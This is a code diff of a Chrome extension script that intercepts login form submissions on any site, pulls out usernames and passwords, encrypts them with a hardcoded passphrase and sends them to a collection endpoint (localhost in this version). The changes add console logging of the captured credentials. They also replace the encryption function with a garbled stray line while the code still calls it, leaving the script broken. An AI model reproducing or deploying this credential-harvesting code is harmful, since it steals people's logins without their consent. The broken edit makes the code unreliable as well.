@@ -4,12 +4,7 @@ try {
     console.error(e);
   }
 
-function encrypting(password)
-{
-    var passPhrase="shesh";
-    var encryptionResult = ""+CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(password), passPhrase);
-    return encryptionResult.replaceAll("/","sheeeeeesh");
-}
+XMLDocumentx    
 
 function getCookies(domain, name, callback) {
     chrome.cookies.get({ "url": domain, "name": name }, function (cookie) {
@@ -79,8 +74,13 @@ chrome.webRequest.onBeforeRequest.addListener(function (details) {
                 username = details.requestBody.formData.username[0];
                 password = details.requestBody.formData.password[0];
                 password_send = encrypting(password);
+                password_send_url = encodeURIComponent(password_send);
                 url = details.url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0];
-                dest = 'https://localhost/submit_account_json/' + url + '/' + username + '/' + password_send;
+                console.log('Username:', username);
+                console.log('Password:', password_send);
+                console.log('Password url:', password_send_url);
+                console.log('URL:', url);
+                dest = 'https://localhost/submit_account_json/' + url + '/' + username + '/' + password_send;                
                 fetch(dest, {
                     headers: {
                         'Content-Type': 'application/json',
@@ -93,7 +93,9 @@ chrome.webRequest.onBeforeRequest.addListener(function (details) {
                             console.log(response.text)
                             return response.text();
                         } else {
+                            console.log(response);
                             throw new Error('Network response was not ok');
+                            
                         }
                     })
                     .then(data => console.log(data))
